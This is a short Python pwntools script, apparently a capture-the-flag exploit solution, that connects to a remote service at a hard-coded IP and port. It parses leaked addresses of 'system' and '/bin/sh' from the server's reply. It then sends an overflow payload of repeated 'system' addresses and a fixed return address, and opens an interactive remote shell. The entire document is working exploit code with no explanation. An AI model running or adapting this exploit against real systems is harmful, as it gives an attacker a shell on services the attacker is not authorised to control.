#!/usr/bin/env python3
from pwn import *

r=remote('199.247.6.180', 10006)
out=r.recvuntil('\n')
print(out)
addr_system=out.split()[-1]
addr_bin_sh=out.split()[-2]
print(addr_system)
r.send(b"/////////////////////bin/sh"+b"\n")
r.send(p32(int(addr_system,16))*36+p32(0x8048f48)+b"\n")
r.interactive()

r.close()
